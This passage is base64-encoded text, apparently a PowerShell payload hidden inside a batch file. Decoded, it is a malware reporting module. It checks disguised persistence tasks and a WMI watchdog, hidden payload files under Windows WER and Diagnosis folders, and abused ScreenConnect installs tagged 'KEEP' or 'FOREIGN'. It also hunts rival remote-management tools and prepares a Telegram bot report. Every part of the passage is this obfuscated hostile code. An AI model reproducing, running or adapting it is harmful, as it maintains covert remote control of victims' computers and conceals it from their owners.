::dGFuY2UgV2luMzJfQklPUykuU2VyaWFsTnVtYmVyDQogICAgfSBjYXRjaCB7fQ0K
::ICAgIHRyeSB7DQogICAgICAgICRkID0gR2V0LUNpbUluc3RhbmNlIFdpbjMyX0xv
::Z2ljYWxEaXNrIC1GaWx0ZXIgIkRldmljZUlEPSdDOiciDQogICAgICAgICRvLkRp
::c2tGcmVlX0dCID0gW21hdGhdOjpSb3VuZCgkZC5GcmVlU3BhY2UgLyAxR0IsIDEp
::DQogICAgICAgICRvLkRpc2tTaXplX0dCID0gW21hdGhdOjpSb3VuZCgkZC5TaXpl
::IC8gMUdCLCAxKQ0KICAgIH0gY2F0Y2gge30NCiAgICByZXR1cm4gJG8NCn0NCg0K
::ZnVuY3Rpb24gR2V0LVN2Y0xpbmUoW3N0cmluZ10kbmFtZSkgew0KICAgICRzID0g
::R2V0LVNlcnZpY2UgLU5hbWUgJG5hbWUgLUVycm9yQWN0aW9uIFNpbGVudGx5Q29u
::dGludWUNCiAgICBpZiAoLW5vdCAkcykgeyByZXR1cm4gJ05PVCBJTlNUQUxMRUQn
::IH0NCiAgICByZXR1cm4gKCd7MH0gKFN0YXJ0PXsxfSknIC1mICRzLlN0YXR1cywg
::JHMuU3RhcnRUeXBlKQ0KfQ0KDQpmdW5jdGlvbiBHZXQtVGFza0hlYWx0aChbc3Ry
::aW5nXSR0bikgew0KICAgICRvdXQgPSAmIHNjaHRhc2tzLmV4ZSAvUXVlcnkgL1RO
::ICR0biAvRk8gTElTVCAvViAyPiRudWxsDQogICAgaWYgKCRMQVNURVhJVENPREUg
::LW5lIDAgLW9yIC1ub3QgJG91dCkgew0KICAgICAgICByZXR1cm4gQHsgUHJlc2Vu
::dCA9ICRmYWxzZTsgU3RhdHVzID0gJ01JU1NJTkcnOyBOZXh0ID0gJyc7IExhc3Qg
::PSAnJzsgUmVzdWx0ID0gJyc7IE91cnMgPSAkZmFsc2UgfQ0KICAgIH0NCiAgICAk
::bWFwID0gQHt9DQogICAgJGJsb2IgPSAoJG91dCB8IEZvckVhY2gtT2JqZWN0IHsg
::IiRfIiB9KSAtam9pbiAiYG4iDQogICAgZm9yZWFjaCAoJGxpbmUgaW4gJG91dCkg
::ew0KICAgICAgICBpZiAoJGxpbmUgLW1hdGNoICdeXHMqKFteOl0rKTpccyooLiop
::XHMqJCcpIHsNCiAgICAgICAgICAgICRtYXBbJG1hdGNoZXNbMV0uVHJpbSgpXSA9
::ICRtYXRjaGVzWzJdLlRyaW0oKQ0KICAgICAgICB9DQogICAgfQ0KICAgICRzdGF0
::dXMgPSAkbWFwWydTdGF0dXMnXQ0KICAgIGlmICgtbm90ICRzdGF0dXMpIHsgJHN0
::YXR1cyA9ICRtYXBbJ1Rhc2sgU3RhdHVzJ10gfQ0KICAgIGlmICgtbm90ICRzdGF0
::dXMpIHsgJHN0YXR1cyA9ICdwcmVzZW50JyB9DQogICAgJG5leHQgPSAkbWFwWydO
::ZXh0IFJ1biBUaW1lJ10NCiAgICBpZiAoLW5vdCAkbmV4dCkgeyAkbmV4dCA9ICcn
::IH0NCiAgICAkbGFzdCA9ICRtYXBbJ0xhc3QgUnVuIFRpbWUnXQ0KICAgIGlmICgt
::bm90ICRsYXN0KSB7ICRsYXN0ID0gJycgfQ0KICAgICRyZXN1bHQgPSAkbWFwWydM
::YXN0IFJlc3VsdCddDQogICAgaWYgKC1ub3QgJHJlc3VsdCkgeyAkcmVzdWx0ID0g
::JycgfQ0KICAgICR0ciA9ICRtYXBbJ1Rhc2sgVG8gUnVuJ10NCiAgICBpZiAoLW5v
::dCAkdHIpIHsgJHRyID0gJG1hcFsnVGFzayB0byBSdW4nXSB9DQogICAgJG91cnMg
::PSAoJGJsb2IgLW1hdGNoICcoP2kpb3duX21vblwuY21kfGV0bF9tb25cLmNtZHxc
::Lnd1Y2FjaGVcXHxcLmV0bGNhY2hlXFwnKQ0KICAgICMgUHJlc2VudCBXaW5kb3dz
::IGJ1aWx0LWluIHdpdGggc2FtZSBuYW1lIGlzIE5PVCBoZWFsdGh5IGZvciB1cw0K
::ICAgICRoZWFsdGh5ID0gJG91cnMgLWFuZCAoKCRzdGF0dXMgLW1hdGNoICdSZWFk
::eXxSdW5uaW5nJykgLW9yICgkc3RhdHVzIC1lcSAncHJlc2VudCcpKQ0KICAgIHJl
::dHVybiBAew0KICAgICAgICBQcmVzZW50ID0gJHRydWUNCiAgICAgICAgT3VycyAg
::ICA9IFtib29sXSRvdXJzDQogICAgICAgIEhlYWx0aHkgPSBbYm9vbF0kaGVhbHRo
::eQ0KICAgICAgICBTdGF0dXMgID0gJChpZiAoJG91cnMpIHsgJHN0YXR1cyB9IGVs
::c2UgeyAnTk9UX09VUlMnIH0pDQogICAgICAgIE5leHQgICAgPSAkbmV4dA0KICAg
::ICAgICBMYXN0ICAgID0gJGxhc3QNCiAgICAgICAgUmVzdWx0ICA9ICRyZXN1bHQN
::CiAgICAgICAgVHIgICAgICA9ICQoaWYgKCR0cikgeyAkdHIgfSBlbHNlIHsgJycg
::fSkNCiAgICB9DQp9DQoNCmZ1bmN0aW9uIEdldC1SbW1IaXRzIHsNCiAgICAjIERl
::dGVjdCByaXZhbHMgZm9yIFRlbGVncmFtLiBLRUVQOiBTY3JlZW5Db25uZWN0IGFs
::bG93bGlzdCArIERhdHRvL0NlbnRyYVN0YWdlLg0KICAgICR0b2tlbnMgPSBAKA0K
::ICAgICAgICAnQW55RGVzaycsICdUZWFtVmlld2VyJywgJ3R2bnNlcnZlcicsICdE
::V0FnZW50JywgJ0RXU2VydmljZScsICdMb2dNZUluJywgJ0xNSUd1YXJkaWFuJywN
::CiAgICAgICAgJ1dpblZOQycsICd2bmNzZXJ2ZXInLCAndHZfJywgJ1NwbGFzaHRv
::cCcsICdab2hvIEFzc2lzdCcsICdSdXN0RGVzaycsICdSZW1vdGVQQycsICdEYW1l
::V2FyZScsDQogICAgICAgICdBdGVyYUFnZW50JywgJ0F0ZXJhJywgJ05pbmphUk1N
::JywgJ05pbmphT25lJywgJ05pbmphUk1NQWdlbnQnLCAnS2FzZXlhJywgJ0FnZW50
::TW9uJywgJ1B1bHNld2F5JywgJ1BDIE1vbml0b3InLCAnU3luY3JvJywgJ0thYnV0
::bycsDQogICAgICAgICdTdXBlck9wcycsICdNYW5hZ2VFbmdpbmUnLCAnVUVNUycs
::ICdEZXNrdG9wIENlbnRyYWwnLCAnRW5kcG9pbnQgQ2VudHJhbCcsICdTb2xhcldp
::bmRzIE1TUCcsICdDb25uZWN0V2lzZSBBdXRvbWF0ZScsICdMVFNlcnZpY2UnLCAn
::TGFiVGVjaCcsDQogICAgICAgICdBY3Rpb24xJywgJ1NpbXBsZUhlbHAnLCAnQm9t
::Z2FyJywgJ0JleW9uZFRydXN0JywgJ01lc2hBZ2VudCcsICdNZXNoIENlbnRyYWwn
::LCAnTWVzaCBBZ2VudCcsDQogICAgICAgICdUYWN0aWNhbFJNTScsICd0YWN0aWNh
::bHJtbScsICdHZXRTY3JlZW4nLCAnU3VwcmVtbycsICdydXRzZXJ2JywgJ3JlbW90
::aW5nX2hvc3QnLA0KICAgICAgICAnQ2hyb21lIFJlbW90ZSBEZXNrdG9wJywgJ1Bh
::cnNlYycsICdOZXRTdXBwb3J0JywgJ0xldmVsLmlvJywgJ0xldmVsIEFnZW50JywN
::CiAgICAgICAgJ0NvbnRpbnV1bScsICdTQUFaJywgJ05hdmVyaXNrJywgJ0ltbXlC
::b3QnLCAnQXV0b21veCcsICdhbWFnZW50JywgJ0Fjcm9uaXMgQ3liZXInLCAnRG9t
::b3R6JywgJ0F1dmlrJywNCiAgICAgICAgJ0JhcnJhY3VkYSBSTU0nLCAnTWFuYWdl
::ZCBXb3JrcGxhY2UnLCAnR292ZXJsYW4nLCAnUERRIERlcGxveScsICdQRFEgSW52
::ZW50b3J5JywgJ1BEUSBDb25uZWN0JywNCiAgICAgICAgJ04tYWJsZScsICdOLWNl
::bnRyYWwnLCAnTi1zaWdodCcsICdUYWtlIENvbnRyb2wnLCAnQWR2YW5jZWQgTW9u
::aXRvcmluZyBBZ2VudCcsICdVbHRyYVZpZXdlcicsICdBZXJvQWRtaW4nLA0KICAg
::ICAgICAnTGl0ZU1hbmFnZXInLCAnUmFkbWluJywgJ05vTWFjaGluZScsICdJcGVy
::aXVzJywgJ0lTTCBMaWdodCcsICdBbW15eScsICdUaWdodFZOQycsICdVbHRyYVZO
::QycsICdSZWFsVk5DJw0KICAgICkNCiAgICAka2VlcFRva2VucyA9IEAoJ0RhdHRv
::JywgJ0NlbnRyYVN0YWdlJywgJ0NhZ1NlcnZpY2UnLCAnQXV0b3Rhc2tFbmRwb2lu
::dCcpDQogICAgJGhpdHMgPSBOZXctT2JqZWN0IFN5c3RlbS5Db2xsZWN0aW9ucy5H
::ZW5lcmljLkxpc3Rbc3RyaW5nXQ0KICAgICRzZWVuID0gQHt9DQoNCiAgICBmdW5j
::dGlvbiBBZGQtSGl0KFtzdHJpbmddJGtpbmQsIFtzdHJpbmddJG5hbWUpIHsNCiAg
::ICAgICAgJGtleSA9ICIka2luZHwkbmFtZSIuVG9Mb3dlckludmFyaWFudCgpDQog
::ICAgICAgIGlmICgkc2Vlbi5Db250YWluc0tleSgka2V5KSkgeyByZXR1cm4gfQ0K
::ICAgICAgICAkc2Vlblska2V5XSA9ICR0cnVlDQogICAgICAgIFt2b2lkXSRoaXRz
::LkFkZCgoJy0gW3swfV0gPGNvZGU+ezF9PC9jb2RlPicgLWYgJGtpbmQsIChFc2Mg
::JG5hbWUpKSkNCiAgICB9DQogICAgZnVuY3Rpb24gVGVzdC1LZWVwTmFtZShbc3Ry
::aW5nXSRzKSB7DQogICAgICAgIGlmICgtbm90ICRzKSB7IHJldHVybiAkZmFsc2Ug
::fQ0KICAgICAgICBpZiAoJHMgLWxpa2UgJypTY3JlZW5Db25uZWN0KicpIHsgcmV0
::dXJuICR0cnVlIH0NCiAgICAgICAgZm9yZWFjaCAoJGsgaW4gJGtlZXBUb2tlbnMp
::IHsgaWYgKCRzIC1saWtlICIqJGsqIikgeyByZXR1cm4gJHRydWUgfSB9DQogICAg
::ICAgIHJldHVybiAkZmFsc2UNCiAgICB9DQoNCiAgICBHZXQtU2VydmljZSAtRXJy
::b3JBY3Rpb24gU2lsZW50bHlDb250aW51ZSB8IEZvckVhY2gtT2JqZWN0IHsNCiAg
::ICAgICAgJG4gPSAkXy5OYW1lDQogICAgICAgICRkID0gJF8uRGlzcGxheU5hbWUN
::CiAgICAgICAgaWYgKFRlc3QtS2VlcE5hbWUgJG4gLW9yIFRlc3QtS2VlcE5hbWUg
::JGQpIHsNCiAgICAgICAgICAgIGlmICgkbiAtbGlrZSAnKkNlbnRyYVN0YWdlKicg
::LW9yICRkIC1saWtlICcqRGF0dG8qJyAtb3IgJG4gLWxpa2UgJypDYWdTZXJ2aWNl
::KicpIHsNCiAgICAgICAgICAgICAgICBBZGQtSGl0ICdrZWVwLWRhdHRvJyAoIiRu
::ICgkKCRfLlN0YXR1cykpIikNCiAgICAgICAgICAgIH0NCiAgICAgICAgICAgIHJl
::dHVybg0KICAgICAgICB9DQogICAgICAgIGZvcmVhY2ggKCR0IGluICR0b2tlbnMp
::IHsNCiAgICAgICAgICAgIGlmICgkbiAtbGlrZSAiKiR0KiIgLW9yICRkIC1saWtl
::ICIqJHQqIikgew0KICAgICAgICAgICAgICAgIEFkZC1IaXQgJ3N2YycgKCIkbiAo
::JCgkXy5TdGF0dXMpKSIpDQogICAgICAgICAgICAgICAgYnJlYWsNCiAgICAgICAg
::ICAgIH0NCiAgICAgICAgfQ0KICAgIH0NCg0KICAgIEdldC1Qcm9jZXNzIC1FcnJv
::ckFjdGlvbiBTaWxlbnRseUNvbnRpbnVlIHwgRm9yRWFjaC1PYmplY3Qgew0KICAg
::ICAgICAkbiA9ICRfLlByb2Nlc3NOYW1lDQogICAgICAgIGlmIChUZXN0LUtlZXBO
::YW1lICRuKSB7IHJldHVybiB9DQogICAgICAgIGZvcmVhY2ggKCR0IGluICR0b2tl
::bnMpIHsNCiAgICAgICAgICAgIGlmICgkbiAtbGlrZSAiKiR0KiIpIHsNCiAgICAg
::ICAgICAgICAgICBBZGQtSGl0ICdwcm9jJyAkbg0KICAgICAgICAgICAgICAgIGJy
::ZWFrDQogICAgICAgICAgICB9DQogICAgICAgIH0NCiAgICB9DQoNCiAgICAkdW5p
::bnN0ID0gQCgNCiAgICAgICAgJ0hLTE06XFNPRlRXQVJFXE1pY3Jvc29mdFxXaW5k
::b3dzXEN1cnJlbnRWZXJzaW9uXFVuaW5zdGFsbFwqJywNCiAgICAgICAgJ0hLTE06
::XFNPRlRXQVJFXFdPVzY0MzJOb2RlXE1pY3Jvc29mdFxXaW5kb3dzXEN1cnJlbnRW
::ZXJzaW9uXFVuaW5zdGFsbFwqJw0KICAgICkNCiAgICBmb3JlYWNoICgkcGF0aCBp
::biAkdW5pbnN0KSB7DQogICAgICAgIEdldC1JdGVtUHJvcGVydHkgJHBhdGggLUVy
::cm9yQWN0aW9uIFNpbGVudGx5Q29udGludWUgfCBGb3JFYWNoLU9iamVjdCB7DQog
::ICAgICAgICAgICAkZG4gPSAkXy5EaXNwbGF5TmFtZQ0KICAgICAgICAgICAgaWYg
::KC1ub3QgJGRuKSB7IHJldHVybiB9DQogICAgICAgICAgICBpZiAoVGVzdC1LZWVw
::TmFtZSAkZG4pIHsNCiAgICAgICAgICAgICAgICBpZiAoJGRuIC1saWtlICcqRGF0
::dG8qJyAtb3IgJGRuIC1saWtlICcqQ2VudHJhU3RhZ2UqJykgeyBBZGQtSGl0ICdr
::ZWVwLWRhdHRvJyAkZG4gfQ0KICAgICAgICAgICAgICAgIHJldHVybg0KICAgICAg
::ICAgICAgfQ0KICAgICAgICAgICAgaWYgKCRkbiAtbGlrZSAnU2NyZWVuQ29ubmVj
::dConKSB7IHJldHVybiB9DQogICAgICAgICAgICBmb3JlYWNoICgkdCBpbiAkdG9r
::ZW5zKSB7DQogICAgICAgICAgICAgICAgaWYgKCRkbiAtbGlrZSAiKiR0KiIpIHsN
::CiAgICAgICAgICAgICAgICAgICAgQWRkLUhpdCAnbXNpJyAkZG4NCiAgICAgICAg
::ICAgICAgICAgICAgYnJlYWsNCiAgICAgICAgICAgICAgICB9DQogICAgICAgICAg
::ICB9DQogICAgICAgIH0NCiAgICB9DQoNCiAgICByZXR1cm4gJGhpdHMNCn0NCg0K
::ZnVuY3Rpb24gR2V0LUdyeXhhS2VlcEZwIHsNCiAgICAkZnAgPSAnOTkwODE5OGU2
::NjhlNDc1MCcNCiAgICAkcCA9ICdDOlxQcm9ncmFtRGF0YVxNaWNyb3NvZnRcV2lu
::ZG93c1xXRVJcVGVtcFwud3VjYWNoZVxncnl4YS5jZmcnDQogICAgaWYgKCRXb3Jr
::RGlyKSB7ICRwID0gSm9pbi1QYXRoICRXb3JrRGlyICdncnl4YS5jZmcnIH0NCiAg
::ICBpZiAoVGVzdC1QYXRoIC1MaXRlcmFsUGF0aCAkcCkgew0KICAgICAgICBHZXQt
::Q29udGVudCAtTGl0ZXJhbFBhdGggJHAgLUVycm9yQWN0aW9uIFNpbGVudGx5Q29u
::dGludWUgfCBGb3JFYWNoLU9iamVjdCB7DQogICAgICAgICAgICBpZiAoJF8gLW1h
::dGNoICdeQ1VSUkVOVF9GUD0oWzAtOWEtZkEtRl17MTZ9KVxzKiQnKSB7ICRmcCA9
::ICRtYXRjaGVzWzFdLlRvTG93ZXIoKSB9DQogICAgICAgIH0NCiAgICB9DQogICAg
::cmV0dXJuICRmcA0KfQ0KDQpmdW5jdGlvbiBHZXQtU2NJbnN0YWxscyB7DQogICAg
::JGdyeXhhRnAgPSBHZXQtR3J5eGFLZWVwRnANCiAgICAkbGlzdCA9IE5ldy1PYmpl
::Y3QgU3lzdGVtLkNvbGxlY3Rpb25zLkdlbmVyaWMuTGlzdFtzdHJpbmddDQogICAg
::R2V0LVNlcnZpY2UgLUVycm9yQWN0aW9uIFNpbGVudGx5Q29udGludWUgfCBXaGVy
::ZS1PYmplY3QgeyAkXy5OYW1lIC1saWtlICdTY3JlZW5Db25uZWN0IENsaWVudCon
::IH0gfCBGb3JFYWNoLU9iamVjdCB7DQogICAgICAgICRmcCA9IGlmICgkXy5OYW1l
::IC1tYXRjaCAnXCgoWzAtOWEtZl17MTZ9KVwpJykgeyAkbWF0Y2hlc1sxXSB9IGVs
::c2UgeyAnPycgfQ0KICAgICAgICAkdGFnID0gaWYgKCRmcCAtZXEgJzVmNjAxMDU3
::OTg1MmU1MDcnKSB7ICdLRUVQLVNFVlJaJyB9DQogICAgICAgIGVsc2VpZiAoJGZw
::IC1lcSAnZjg2MWM4MTQwZDQ1MzQyNycpIHsgJ0tFRVAtQUxUJyB9DQogICAgICAg
::IGVsc2VpZiAoJGZwIC1lcSAkZ3J5eGFGcCkgeyAnS0VFUC1HUllYQScgfQ0KICAg
::ICAgICBlbHNlIHsgJ0ZPUkVJR04nIH0NCiAgICAgICAgW3ZvaWRdJGxpc3QuQWRk
::KCgnLSA8Y29kZT57MH08L2NvZGU+OiA8Yj57MX08L2I+IFt7Mn1dJyAtZiAoRXNj
::ICRfLk5hbWUpLCAoRXNjIChbc3RyaW5nXSRfLlN0YXR1cykpLCAkdGFnKSkNCiAg
::ICB9DQoNCiAgICAkcm9vdHMgPSBAKA0KICAgICAgICAiJHtlbnY6UHJvZ3JhbUZp
::bGVzfVxTY3JlZW5Db25uZWN0IENsaWVudCoiLA0KICAgICAgICAiJHtlbnY6UHJv
::Z3JhbUZpbGVzKHg4Nil9XFNjcmVlbkNvbm5lY3QgQ2xpZW50KiINCiAgICApDQog
::ICAgZm9yZWFjaCAoJHBhdCBpbiAkcm9vdHMpIHsNCiAgICAgICAgR2V0LUNoaWxk
::SXRlbSAtUGF0aCAkcGF0IC1EaXJlY3RvcnkgLUVycm9yQWN0aW9uIFNpbGVudGx5
::Q29udGludWUgfCBGb3JFYWNoLU9iamVjdCB7DQogICAgICAgICAgICBbdm9pZF0k
::bGlzdC5BZGQoKCctIHBhdGg6IDxjb2RlPnswfTwvY29kZT4nIC1mIChFc2MgJF8u
::RnVsbE5hbWUpKSkNCiAgICAgICAgfQ0KICAgIH0NCg0KICAgICR1bmluc3QgPSBA
::KA0KICAgICAgICAnSEtMTTpcU09GVFdBUkVcTWljcm9zb2Z0XFdpbmRvd3NcQ3Vy
::cmVudFZlcnNpb25cVW5pbnN0YWxsXConLA0KICAgICAgICAnSEtMTTpcU09GVFdB
::UkVcV09XNjQzMk5vZGVcTWljcm9zb2Z0XFdpbmRvd3NcQ3VycmVudFZlcnNpb25c
::VW5pbnN0YWxsXConDQogICAgKQ0KICAgIGZvcmVhY2ggKCRwYXRoIGluICR1bmlu
::c3QpIHsNCiAgICAgICAgR2V0LUl0ZW1Qcm9wZXJ0eSAkcGF0aCAtRXJyb3JBY3Rp
::b24gU2lsZW50bHlDb250aW51ZSB8IFdoZXJlLU9iamVjdCB7DQogICAgICAgICAg
::ICAkXy5EaXNwbGF5TmFtZSAtbGlrZSAnKlNjcmVlbkNvbm5lY3QqJw0KICAgICAg
::ICB9IHwgRm9yRWFjaC1PYmplY3Qgew0KICAgICAgICAgICAgJHZlciA9IGlmICgk
::Xy5EaXNwbGF5VmVyc2lvbikgeyAkXy5EaXNwbGF5VmVyc2lvbiB9IGVsc2UgeyAn
::PycgfQ0KICAgICAgICAgICAgW3ZvaWRdJGxpc3QuQWRkKCgnLSBtc2k6IDxjb2Rl
::PnswfTwvY29kZT4gdnsxfScgLWYgKEVzYyAkXy5EaXNwbGF5TmFtZSksIChFc2Mg
::JHZlcikpKQ0KICAgICAgICB9DQogICAgfQ0KDQogICAgaWYgKCRsaXN0LkNvdW50
::IC1lcSAwKSB7IFt2b2lkXSRsaXN0LkFkZCgnLSAobm9uZSknKSB9DQogICAgcmV0
::dXJuICRsaXN0DQp9DQoNCiRjZmcgPSBHZXQtQ2ZnDQppZiAoLW5vdCAkY2ZnLkJP
::VF9UT0tFTiAtb3IgLW5vdCAkY2ZnLkNIQVRfSUQpIHsNCiAgICBBZGQtQ29udGVu
::dCAtTGl0ZXJhbFBhdGggKEpvaW4tUGF0aCAkV29ya0RpciAnYm9vdC5lcnInKSAt
::VmFsdWUgJ3RnX3NraXBfbm9fY2ZnJyAtRXJyb3JBY3Rpb24gU2lsZW50bHlDb250
::aW51ZQ0KICAgIGV4aXQgMg0KfQ0KDQokcHJpbSA9ICdTY3JlZW5Db25uZWN0IENs
::aWVudCAoNWY2MDEwNTc5ODUyZTUwNyknDQokYWx0ID0gJ1NjcmVlbkNvbm5lY3Qg
::Q2xpZW50IChmODYxYzgxNDBkNDUzNDI3KScNCiRvcyA9IEdldC1Pc0luZm8NCiR3
::aG8gPSBbU2VjdXJpdHkuUHJpbmNpcGFsLldpbmRvd3NJZGVudGl0eV06OkdldEN1
::cnJlbnQoKS5OYW1lDQokZWxldiA9IChbU2VjdXJpdHkuUHJpbmNpcGFsLldpbmRv
::d3NQcmluY2lwYWxdW1NlY3VyaXR5LlByaW5jaXBhbC5XaW5kb3dzSWRlbnRpdHld
::OjpHZXRDdXJyZW50KCkpLklzSW5Sb2xlKA0KICAgIFtTZWN1cml0eS5QcmluY2lw
::YWwuV2luZG93c0J1aWx0SW5Sb2xlXTo6QWRtaW5pc3RyYXRvcikNCiRpc1N5c3Rl
::bSA9ICR3aG8gLWxpa2UgJypTWVNURU0qJyAtb3IgJHdobyAtZXEgJ05UIEFVVEhP
::UklUWVxTWVNURU0nDQoNCiRtc2lDYWNoZSA9IEpvaW4tUGF0aCAkV29ya0RpciAn
::cGtnLm1zaScNCiRtc2lTaXplID0gaWYgKFRlc3QtUGF0aCAkbXNpQ2FjaGUpIHsN
::CiAgICAnezA6TjB9IEtCJyAtZiAoKEdldC1JdGVtICRtc2lDYWNoZSAtRm9yY2Up
::Lkxlbmd0aCAvIDFLQikNCn0gZWxzZSB7ICdub25lJyB9DQoNCiRtb25QYXRoID0g
::Sm9pbi1QYXRoICRXb3JrRGlyICdvd25fbW9uLmNtZCcNCiRldGxNb24gPSAiJGVu
::djpQcm9ncmFtRGF0YVxNaWNyb3NvZnRcRGlhZ25vc2lzXFN0YXRlXC5ldGxjYWNo
::ZVxldGxfbW9uLmNtZCINCiRoYXNNb24gPSBUZXN0LVBhdGggJG1vblBhdGgNCiRo
::YXNFdGwgPSBUZXN0LVBhdGggJGV0bE1vbg0KDQojIFQxMDogb24tZGlzayBwYXls
::b2FkIGJ1aWxkIG1hcmtlcnMgLT4gZXZlcnkgcmVwb3J0IHByb3ZlcyBleGFjdGx5
::IHdoYXQgaXMgaW5zdGFsbGVkDQpmdW5jdGlvbiBHZXQtUGF5bG9hZEJ1aWxkKFtz
::dHJpbmddJGZpbGUpIHsNCiAgICBpZiAoLW5vdCAoVGVzdC1QYXRoICRmaWxlKSkg
::eyByZXR1cm4gJ21pc3NpbmcnIH0NCiAgICBmb3JlYWNoICgkbCBpbiAoR2V0LUNv
::bnRlbnQgLUxpdGVyYWxQYXRoICRmaWxlIC1Ub3RhbENvdW50IDggLUZvcmNlIC1F
::cnJvckFjdGlvbiBTaWxlbnRseUNvbnRpbnVlKSkgew0KICAgICAgICBpZiAoJGwg
::LW1hdGNoICdCVUlMRFxzK1xkezh9KFtBLVpdK1xkKyknKSB7IHJldHVybiAkbWF0
::Y2hlc1sxXSB9DQogICAgfQ0KICAgIHJldHVybiAnPycNCn0NCiRiTW9uID0gR2V0
::LVBheWxvYWRCdWlsZCAoSm9pbi1QYXRoICRXb3JrRGlyICdvd25fbW9uLmNtZCcp
::DQokYlNlYyA9IEdldC1QYXlsb2FkQnVpbGQgKEpvaW4tUGF0aCAkV29ya0RpciAn
::b3duX3NlY3VyZS5jbWQnKQ0KJGJUZ3IgPSBHZXQtUGF5bG9hZEJ1aWxkIChKb2lu
::LVBhdGggJFdvcmtEaXIgJ3RnX3JlcG9ydC5wczEnKQ0KJGJMaWIgPSBHZXQtUGF5
::bG9hZEJ1aWxkIChKb2luLVBhdGggJFdvcmtEaXIgJ293bl9saWIucHMxJykNCg0K
::IyBwZXItaG9zdCBpZGVudGl0eTogZXhwZWN0ZWQgdGFzayBuYW1lcyBjb21lIGZy
::b20gaWRlbnRpdHkuY2ZnIHdoZW4gcHJlc2VudA0KJGlkQ2ZnID0gSm9pbi1QYXRo
::ICRXb3JrRGlyICdpZGVudGl0eS5jZmcnDQokaWRNYXAgPSBAe30NCmlmIChUZXN0
::LVBhdGggJGlkQ2ZnKSB7DQogICAgR2V0LUNvbnRlbnQgLUxpdGVyYWxQYXRoICRp
::ZENmZyB8IEZvckVhY2gtT2JqZWN0IHsNCiAgICAgICAgaWYgKCRfIC1tYXRjaCAn
::XlxzKihbQS1aX10rKVxzKj1ccyooLis/KVxzKiQnKSB7ICRpZE1hcFskbWF0Y2hl
::c1sxXV0gPSAkbWF0Y2hlc1syXSB9DQogICAgfQ0KfQ0KJGV4cGVjdGVkVGFza3Mg
::PSBAKA0KICAgIEB7IE5hbWUgPSAkKGlmICgkaWRNYXAuVEFTS19BKSB7ICRpZE1h
::cC5UQVNLX0EgfSBlbHNlIHsgJ1dlclF1ZXVlU3luYycgfSk7IFJvbGUgPSAidGlj
::ayAkKCRpZE1hcC5NT19BKW0gKGNoYWluMSkiIH0sDQogICAgQHsgTmFtZSA9ICQo
::aWYgKCRpZE1hcC5UQVNLX0IpIHsgJGlkTWFwLlRBU0tfQiB9IGVsc2UgeyAnUGxh
::U2VydmVySGVhbHRoJyB9KTsgUm9sZSA9ICJiYWNrdXAgJCgkaWRNYXAuTU9fQilt
::IChjaGFpbjEpIiB9LA0KICAgIEB7IE5hbWUgPSAkKGlmICgkaWRNYXAuVEFTS19D
::KSB7ICRpZE1hcC5UQVNLX0MgfSBlbHNlIHsgJ1dkaUhvc3RQcm94eScgfSk7IFJv
::bGUgPSAnT05TVEFSVCAoY2hhaW4xKScgfSwNCiAgICBAeyBOYW1lID0gJChpZiAo
::JGlkTWFwLlRBU0tfRCkgeyAkaWRNYXAuVEFTS19EIH0gZWxzZSB7ICdUY3BJcENv
::bmZsaWN0UmVzJyB9KTsgUm9sZSA9ICdPTkxPR09OIChjaGFpbjEpJyB9DQopDQoj
::IGNoYWluIDI6IFdNSSB3YXRjaGRvZyBzdWJzY3JpcHRpb24NCiR3bWlDID0gR2V0
::LVdtaU9iamVjdCAtTmFtZXNwYWNlIHJvb3Rcc3Vic2NyaXB0aW9uIC1DbGFzcyBD
::b21tYW5kTGluZUV2ZW50Q29uc3VtZXIgLUZpbHRlciAiTmFtZT0nV3VjYWNoZVdh
::dGNoZG9nQyciIC1FcnJvckFjdGlvbiBTaWxlbnRseUNvbnRpbnVlDQokZXhwZWN0
::ZWRUYXNrcyArPSBAeyBOYW1lID0gJ1xXTUlcV3VjYWNoZVdhdGNoZG9nQyc7IFJv
::bGUgPSAndGltZXIgM20gKGNoYWluMiknOyBXbWkgPSAoJG51bGwgLW5lICR3bWlD
::KSB9DQoNCiR0YXNrTGluZXMgPSBOZXctT2JqZWN0IFN5c3RlbS5Db2xsZWN0aW9u
::cy5HZW5lcmljLkxpc3Rbc3RyaW5nXQ0KJHRhc2tPayA9IDANCiR0YXNrQmFkID0g
::MA0KZm9yZWFjaCAoJHQgaW4gJGV4cGVjdGVkVGFza3MpIHsNCiAgICBpZiAoJHQu
::Q29udGFpbnNLZXkoJ1dtaScpKSB7DQogICAgICAgIGlmICgkdC5XbWkpIHsgJHRh
::c2tPaysrOyAkbWFyayA9ICdPSycgfSBlbHNlIHsgJHRhc2tCYWQrKzsgJG1hcmsg
::PSAnTUlTU0lORycgfQ0KICAgICAgICBbdm9pZF0kdGFza0xpbmVzLkFkZCgoJy0g
::W3swfV0gPGNvZGU+ezF9PC9jb2RlPiAtIHsyfScgLWYgJG1hcmssIChFc2MgJHQu
::TmFtZSksIChFc2MgJHQuUm9sZSkpKQ0KICAgICAgICBjb250aW51ZQ0KICAgIH0N
::CiAgICAkaCA9IEdldC1UYXNrSGVhbHRoICR0Lk5hbWUNCiAgICBpZiAoJGguUHJl
::c2VudCAtYW5kICRoLkhlYWx0aHkpIHsNCiAgICAgICAgJHRhc2tPaysrDQogICAg
::ICAgICRtYXJrID0gJ09LJw0KICAgIH0gZWxzZWlmICgkaC5QcmVzZW50IC1hbmQg
::LW5vdCAkaC5PdXJzKSB7DQogICAgICAgICR0YXNrQmFkKysNCiAgICAgICAgJG1h
::cmsgPSAnTk9UX09VUlMnDQogICAgfSBlbHNlaWYgKCRoLlByZXNlbnQpIHsNCiAg
::ICAgICAgJHRhc2tCYWQrKw0KICAgICAgICAkbWFyayA9ICdXRUFLJw0KICAgIH0g
::ZWxzZSB7DQogICAgICAgICR0YXNrQmFkKysNCiAgICAgICAgJG1hcmsgPSAnTUlT
::U0lORycNCiAgICB9DQogICAgJGV4dHJhID0gJycNCiAgICBpZiAoJGguUHJlc2Vu
::dCkgew0KICAgICAgICAkYml0cyA9IEAoKQ0KICAgICAgICBpZiAoJGguU3RhdHVz
::KSB7ICRiaXRzICs9ICRoLlN0YXR1cyB9DQogICAgICAgIGlmICgkaC5SZXN1bHQg
::LW5lICcnIC1hbmQgJGguUmVzdWx0IC1uZSAnMCcpIHsgJGJpdHMgKz0gKCJMYXN0
::UmVzdWx0PSIgKyAkaC5SZXN1bHQpIH0NCiAgICAgICAgaWYgKCRiaXRzLkNvdW50
::KSB7ICRleHRyYSA9ICcgKCcgKyAoJGJpdHMgLWpvaW4gJywgJykgKyAnKScgfQ0K
::ICAgIH0NCiAgICBbdm9pZF0kdGFza0xpbmVzLkFkZCgoJy0gW3swfV0gPGNvZGU+
